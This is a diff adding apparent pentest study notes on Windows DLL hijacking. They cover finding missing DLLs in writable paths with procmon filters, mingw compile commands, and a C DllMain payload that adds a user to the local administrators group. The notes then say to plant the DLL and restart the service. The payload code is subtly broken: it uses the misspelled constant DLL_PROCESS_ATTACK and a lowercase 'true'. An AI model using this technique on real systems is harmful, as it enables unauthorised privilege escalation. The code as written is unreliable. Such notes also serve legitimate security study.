@@ -1,0 +1,49 @@
+
+Dll Hijacking 
+
+DLL - Dynamic Link library. they are like executables but they are not directly executes. 
+      DLL is shared libraries contains functions, classes, and resoureses and variables. dll run with executables. 
+
+Case in DLL Hijacking 
+ 
+We looking for a specific instance, now when a windows environments starts up a service or an application 
+it looks for dlls. Now if the dll doesn't exists then we can get malicious with it. 
+
+Looking for a path which is writable.
+and the dll is not present. 
+
+tool used : procmon : process monitor 
+
+set the filter like 
+
+1. result is NAME NOT FOUND 
+2. path ends with .dll 
+
+Now find the DLL whose path is writeable so that we can replace this dll 
+
+windows_dll.c : 
+
+Compiling Options : 
+
+
+# For x64 compile with : x86_64-w64-mingw32-gcc window_dll.c -shared -o output.dll 
+# For x86 compile with : i686-w64-mingw32-gcc window_dll.c -shared -o output.dll 
+ 
+
+#include<windows.h>
+
+BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved ){
+	if(dwReason == DLL_PROCESS_ATTACK){
+		system("cmd.exe /k net localgroup administrators user  /add");
+		ExitProcess(0);
+	}
+	return true;
+	
+}
+ 
+now save this compiled dll to that location where error occurs 
+
+start the service again and then out payload get executed 
+
+
+
